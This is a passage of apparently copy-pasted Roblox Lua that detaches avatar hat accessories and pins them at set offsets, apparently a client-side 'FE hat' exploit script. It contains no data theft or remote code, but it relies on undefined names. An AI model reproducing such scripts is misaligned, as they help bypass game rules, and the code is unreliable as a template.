local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 9.5
Zval.Value = 8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing10()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing10"
local HAT = "cealing10"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 9.5
Zval.Value = -8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing11()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing11"
local HAT = "cealing11"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 9.5
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing12()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing12"
local HAT = "cealing12"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 9.5
Zval.Value = -4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing13()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing13"
local HAT = "cealing13"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 9.5
Zval.Value = 4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


local function cealing14()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing14"
local HAT = "cealing14"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 9.5
Zval.Value = 8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing15()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing15"
local HAT = "cealing15"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 9.5
Zval.Value = -8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing16()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing16"
local HAT = "cealing16"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 9.5
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing17()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing17"
local HAT = "cealing17"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 9.5
Zval.Value = 4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing18()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing18"
local HAT = "cealing18"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 9.5
Zval.Value = -4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing19()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing19"
local HAT = "cealing19"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 9.5
Zval.Value = 8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end


local function cealing20()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing20"
local HAT = "cealing20"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 9.5
Zval.Value = -8

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing21()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing21"
local HAT = "cealing21"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 9.5
Zval.Value = 0

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing22()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing22"
local HAT = "cealing22"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 9.5
Zval.Value = 4

XvalO.Value = 90
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function cealing23()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "cealing23"
local HAT = "cealing23"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

